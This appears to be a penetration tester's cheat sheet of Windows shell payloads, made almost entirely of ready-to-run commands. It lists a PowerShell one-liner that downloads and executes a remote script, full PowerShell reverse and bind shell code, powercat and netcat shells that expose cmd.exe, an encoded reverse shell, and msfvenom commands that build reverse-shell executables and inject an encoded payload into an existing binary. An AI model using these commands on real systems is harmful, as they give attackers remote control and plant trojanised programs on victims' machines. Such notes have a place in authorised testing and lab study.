## Powershell shells

```
powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.xx.xxx:8000/Invoke-PowerShellTcp.ps1')"
```

```
// reverse shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

// bind shell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

## Powercat shell

```
// reverse shell
powercat -c 10.11.0.4 -p 443 -e cmd.exe
sudo nc -lvp 443

// bind shell
powercat -l -p 443 -e cmd.exe
nc 10.11.0.22 443
```

## Base64 encoded powershell reverse shell

```
// generate base64 encoded reverse shell command
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1

// needs to pass the whole
encoded string to powershell.exe
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFM
AZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBt
```

## Msfvenom

* Meterpreter

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe
```

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```

* Non-staged payload (works with nc)

```
msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe
```

```
use exploit/multi/handler
set payload windows/shell_reverse_tcp
```

* Staged payload (must be caught with metasploit)

```
msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe
```

```
use exploit/multi/handler
set payload windows/shell/reverse_tcp
```

* Inject payload into binary

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x "/somebinary.exe" -o bad_binary.exe
```

## Netcat Shell

```
nc.exe -nlvp 4444 -e cmd.exe
nc.exe 192.168.1.101 443 -e cmd.exe

ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl
ncat -nv <ip_to_connect> 4444
```

